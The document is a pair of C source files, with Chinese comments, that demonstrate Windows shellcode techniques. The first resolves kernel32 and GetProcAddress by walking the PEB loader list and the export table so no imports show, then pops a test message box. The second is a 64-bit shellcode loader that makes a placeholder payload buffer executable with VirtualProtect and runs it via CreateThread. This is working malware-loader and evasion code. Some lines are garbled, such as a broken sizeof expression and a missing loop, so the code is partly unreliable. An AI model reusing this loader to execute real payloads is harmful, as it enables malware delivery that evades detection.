#include "stdafx.h"
#include <windows.h>
#include <stdio.h>
#include <string.h>
typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
} UNICODE_STRING, * PUNICODE_STRING;
typedef struct _PEB_LDR_DATA
{
	DWORD Length;
	bool Initialized;
	PVOID SsHandle;
	LIST_ENTRY InLoadOrderModuleList;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, * PPEB_LDR_DATA;
typedef struct _LDR_DATA_TABLE_ENTRY
{
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	PVOID DllBase;
	PVOID EntryPoint;
	UINT32 SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	UINT32 Flags;
	USHORT LoadCount;
	USHORT TlsIndex;
	LIST_ENTRY HashLinks;
	PVOID SectionPointer;
	UINT32 CheckSum;
	UINT32 TimeDateStamp;
	PVOID LoadedImports;
	PVOID EntryPointActivationContext;
	PVOID PatchInformation;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;
typedef HMODULE(WINAPI* PLOADLIBRARY)(LPCSTR);
typedef DWORD(WINAPI* PGETPROCADDRESS)(HMODULE, LPCSTR);
typedef DWORD(WINAPI* PMESSAGEBOX)(HWND, LPCSTR, LPCSTR, UINT);
DWORD WINAPI ShellCode();
int main(int argc, char* argv[])
{
	ShellCode();
	getchar();
	return 0;
}
DWORD WINAPI ShellCode()
{
	PGETPROCADDRESS pGetProcAddress = NULL;
	PLOADLIBRARY pLoadLibrary = NULL;
	PMESSAGEBOX pMessageBox = NULL;
	PLDR_DATA_TABLE_ENTRY pPLD;
	PLDR_DATA_TABLE_ENTRY pBeg;
	WORD* pFirst = NULL;
	WORD* pLast = NULL;
	DWORD ret = 0, i = 0;
	DWORD dwKernelBase = 0;
	char szKernel32[] =
	{ 'k',0,'e',0,'r',0,'n',0,'e',0,'l',0,'3',0,'2',0,'.',0,'d',0,'l',0,'l',0,0,0 };
	// Unicode
	char szUser32[] = { 'u','s','e','r','3','2','.','d','l','l',0 };
	char szGetProcAddress[] =
	{ 'G','e','t','P','r','o','c','A','d','d','r','e','s','s',0 };
	char szLoadLibrary[] = { 'L','o','a','d','L','i','b','r','a','r','y','A',0 };
	char szMessageBox[] = { 'M','e','s','s','a','g','e','B','o','x','A',0 };
	char szHelloShellCode[] =
	{ 'H','e','l','l','o','S','h','e','l','l','C','o','d','e',0 };
	__asm
	{
		mov eax, fs: [0x30] // PEB
		mov eax, [eax + 0x0C] // PEB->LDR
		add eax, 0x0C // LDR->InLoadOrderModuleList
		mov pBeg, eax
		mov eax, [eax]
		mov pPLD, eax
	}
	// Find Kerner32.dll
	while (pPLD != pBeg)
	{
		pLast = (WORD*)pPLD->BaseDllName.Buffer;
		pFirst = (WORD*)szKernel32;
		while (*pFirst && *pLast == *pFirst)
			pFirst++, pLast++;
		if (*pFirst == *pLast)
		{
			dwKernelBase = (DWORD)pPLD->DllBase;
			break;
		}
		pPLD = (LDR_DATA_TABLE_ENTRY*)pPLD->InLoadOrderLinks.Flink;
	}
	// Kernel32.dll -> GetProcAddress
	if (dwKernelBase != 0)
	{
		// 通过指针定位到导出表
		PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)dwKernelBase;
		PIMAGE_NT_HEADERS pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader +
			pDosHeader->e_lfanew);
		PIMAGE_FILE_HEADER pPEHeader = (PIMAGE_FILE_HEADER)((DWORD)pDosHeader +
			pDosHeader->e_lfanew + 4);
		PIMAGE_OPTIONAL_HEADER32 pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)
			((DWORD)pPEHeader + sizeof(/images/shellcode/image_FILE_HEADER));
		PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)
			((DWORD)pOptionHeader + pPEHeader->SizeOfOptionalHeader);
		PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)
			((DWORD)dwKernelBase + pOptionHeader->DataDirectory[0].VirtualAddress);
		// 导出函数地址表RVA
		DWORD* pAddOfFun_Raw = (DWORD*)((DWORD)dwKernelBase + pExportDirectory -> AddressOfFunctions);
// 导出函数名称表RVA
WORD* pAddOfOrd_Raw = (WORD*)((DWORD)dwKernelBase + pExportDirectory -> AddressOfNameOrdinals);
// 导出函数序号表RVA
DWORD* pAddOfNames_Raw = (DWORD*)((DWORD)dwKernelBase +
	pExportDirectory->AddressOfNames);
DWORD dwCnt = 0;
char* pFinded = NULL, * pSrc = szGetProcAddress;
for (; dwCnt < pExportDirectory->NumberOfNames; dwCnt++)
{
	pFinded = (char*)((DWORD)dwKernelBase + pAddOfNames_Raw[dwCnt]);
	while (*pFinded && *pFinded == *pSrc)
		pFinded++, pSrc++;
		if (*pFinded == *pSrc)
		{
			pGetProcAddress = (PGETPROCADDRESS)
				(pAddOfFun_Raw[pAddOfOrd_Raw[dwCnt]] + (DWORD)dwKernelBase);
			break;
		}
	pSrc = szGetProcAddress;
}
	}
	// 通过pGetProcAddress进行调用
	pLoadLibrary = (PLOADLIBRARY)pGetProcAddress((HMODULE)dwKernelBase,
		szLoadLibrary);
	pMessageBox =
		(PMESSAGEBOX)pGetProcAddress(pLoadLibrary(szUser32), szMessageBox);
	pMessageBox(NULL, szHelloShellCode, 0, MB_OK);
	return 0;
}


#include <stdio.h>
#include <windows.h>
typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
} UNICODE_STRING, * PUNICODE_STRING;
PVOID64 __stdcall GetInInitializationOrderModuleList();

HMODULE getKernel32Address() {
	LIST_ENTRY* pNode = (LIST_ENTRY*)GetInInitializationOrderModuleList(); // 获取InInitializationOrderModuleList
		UNICODE_STRING* FullDllName = (UNICODE_STRING*)((BYTE*)pNode + 0x38);
	if (*(FullDllName->Buffer + 12) == '\0') {
		return (HMODULE)(*((ULONG64*)((BYTE*)pNode + 0x10)));
		}
	pNode = pNode->Flink;
}
DWORD64 getGetProcAddress(HMODULE hKernal32) {
	PIMAGE_DOS_HEADER baseAddr = (PIMAGE_DOS_HEADER)hKernal32; // 获取DOS头
	PIMAGE_NT_HEADERS pImageNt = (PIMAGE_NT_HEADERS)((LONG64)baseAddr +
		baseAddr->e_lfanew); // 偏移到NT头将shellcode存储在资源里
		PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)
		((LONG64)baseAddr + pImageNt -> OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); //获取导出表
PULONG RVAFunctions = (PULONG)((LONG64)baseAddr + exportDir -> AddressOfFunctions); // 获取导出函数地址RVA数组地址
PULONG RVANames = (PULONG)((LONG64)baseAddr + exportDir->AddressOfNames); //获取导出函数名RVA数组地址
PUSHORT AddressOfNameOrdinals = (PUSHORT)((LONG64)baseAddr + exportDir -> AddressOfNameOrdinals); // 获取导出函数序号数组地址
for (size_t i = 0; i < exportDir->NumberOfNames; i++) { // 遍历函数
	LONG64 F_va_Tmp = (ULONG64)((LONG64)baseAddr +
		RVAFunctions[(USHORT)AddressOfNameOrdinals[i]]); // 当前函数地址
	PUCHAR FunctionName = (PUCHAR)((LONG64)baseAddr + RVANames[i]); // 当前函数名地址
		if (!strcmp((const char*)FunctionName, "GetProcAddress")) {
			return F_va_Tmp;
		}
}
}
typedef FARPROC(WINAPI* pGetProcAddress)(HMODULE, LPCSTR);
typedef BOOL(WINAPI* pVirtualProtect)(LPVOID, DWORD, DWORD, PDWORD);
typedef HANDLE(WINAPI* pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T,
	LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD(WINAPI* pWaitForSingleObject)(HANDLE, DWORD);
int main() {
	unsigned char buf[] = "x64shellcode";
	HMODULE hKernal32 = getKernel32Address(); // 获取Kernel32
	pGetProcAddress GetProcAddress = (pGetProcAddress)getGetProcAddress(hKernal32); // 获取GetProcAddress地址
	pVirtualProtect VirtualProtect = (pVirtualProtect)GetProcAddress(hKernal32,
		"VirtualProtect");
	pCreateThread CreateThread = (pCreateThread)GetProcAddress(hKernal32,
		"CreateThread");
	pWaitForSingleObject WaitForSingleObject =
		(pWaitForSingleObject)GetProcAddress(hKernal32, "WaitForSingleObject");
	DWORD oldProtect;
	VirtualProtect((LPVOID)buf, sizeof(buf), PAGE_EXECUTE_READWRITE,
		&oldProtect);
	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)(LPVOID)buf,
		NULL, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);
	return 0;
}
